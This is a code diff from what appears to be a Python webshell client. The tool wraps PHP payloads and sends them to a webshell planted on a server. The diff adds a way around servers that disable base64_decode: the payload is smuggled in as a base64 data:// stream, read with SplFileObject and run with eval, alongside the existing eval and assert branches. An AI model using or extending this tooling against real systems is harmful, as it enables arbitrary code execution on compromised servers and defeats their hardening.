@@ -286,7 +286,7 @@ def get_db_connect_code(host="", username="", password="", dbname="", port=""):
 def get_ini_value_code():
     return """function get_ini_value($key){
     if(function_exists('ini_get')){
-        return ini_get($key);    
+        return ini_get($key);
     } else if(function_exists('ini_get_all')) {
         $gev = version_compare(PHP_VERSION,'5.3.0','ge');
         if($gev){
@@ -597,7 +597,9 @@ def send(phpcode: str, raw: bool = False, **extra_params):
 
         phpcode += f"""{encode_tail}print("{tail}");"""
 
-        if (php_v7):
+        if (gget("webshell.disable_base64_decode", "webshell")):
+            phpcode = """$_="";$__=new SplFileObject("data://text/plain;base64,%s");foreach($__ as $___){$_.=$___."\\n";}eval($_);""" % (base64_encode(phpcode))
+        elif (php_v7):
             phpcode = f"""eval(base64_decode("{base64_encode(phpcode)}"));"""
         else:
             phpcode = f"""assert(eval(base64_decode("{base64_encode(phpcode)}")));"""
